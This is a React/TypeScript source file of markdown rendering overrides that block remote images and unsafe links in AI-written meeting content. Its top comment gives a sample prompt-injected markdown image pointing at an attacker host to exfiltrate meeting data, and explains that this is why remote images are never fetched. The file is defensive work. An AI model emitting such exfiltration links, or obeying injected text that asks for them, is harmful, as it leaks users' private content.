import type { Components } from "react-markdown";
import { isSafeExternalHref, isSafeMediaSrc } from "../safeContent";

/* react-markdown overrides for AI-written content (Enhance blocks, Ask
   answers). Images from the network are never fetched — a prompt-injected
   `![](https://attacker/?d=…)` would otherwise leak meeting content the moment
   it renders — and links open in the system browser, never in the app window. */

export const SAFE_IMG: Components["img"] = ({ src, alt }) =>
  typeof src === "string" && isSafeMediaSrc(src) ? (
    <img src={src} alt={alt ?? ""} className="max-w-full" />
  ) : (
    <span className="text-text-3" title="Remote image not loaded (privacy)">
      {alt ? `[image: ${alt}]` : "[image]"}
    </span>
  );

export function SafeLink({
  href,
  title,
  className,
  children,
}: {
  href?: string;
  title?: string;
  className?: string;
  children?: React.ReactNode;
}) {
  if (!isSafeExternalHref(href)) return <span className={className}>{children}</span>;
  return (
    <a
      href={href}
      title={title ?? href}
      className={className}
      rel="noopener noreferrer"
      // Clicks are handled once, app-wide, by installLinkGuard (main.tsx): it
      // opens the link in the system browser and never navigates this window.
    >
      {children}
    </a>
  );
}

export const SAFE_A: Components["a"] = ({ href, title, children }) => (
  <SafeLink href={href} title={title}>
    {children}
  </SafeLink>
);
